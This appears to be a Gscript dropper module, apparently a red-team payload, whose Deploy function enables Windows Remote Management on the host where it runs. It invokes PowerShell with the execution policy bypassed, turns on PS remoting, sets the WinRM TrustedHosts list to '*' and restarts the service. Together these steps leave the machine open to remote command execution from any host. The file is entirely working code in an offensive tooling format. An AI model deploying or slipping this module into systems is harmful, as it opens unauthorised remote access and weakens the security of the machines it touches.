// Example Enable WinRM
// Title: Enable WinRM
// Author: ahhh
// Purpose: Enable WinRM
// Gscript version: 1.0.0
// ATT&CK: 

//priority:98
//timeout:190

function Deploy() {
    console.log("Starting Enable WinRM");

    G.exec.ExecuteCommand("powershell", ["-ExecutionPolicy", "bypass", "-c", "Enable-PSRemoting", "-force"])
    G.exec.ExecuteCommand("powershell", ["-ExecutionPolicy", "bypass", "-c", "winrm", "quickconfig", "-quiet"])
    G.exec.ExecuteCommand("powershell", ["-ExecutionPolicy", "bypass", "-c", "Set-Item", "-force", "wsman:\localhost\client\trustedhosts *"])
    G.exec.ExecuteCommand("powershell", ["-ExecutionPolicy", "bypass", "-c", "restart-service", "-force", "WinRM"])

    console.log("Done Enable WinRM");
    return true;
  }
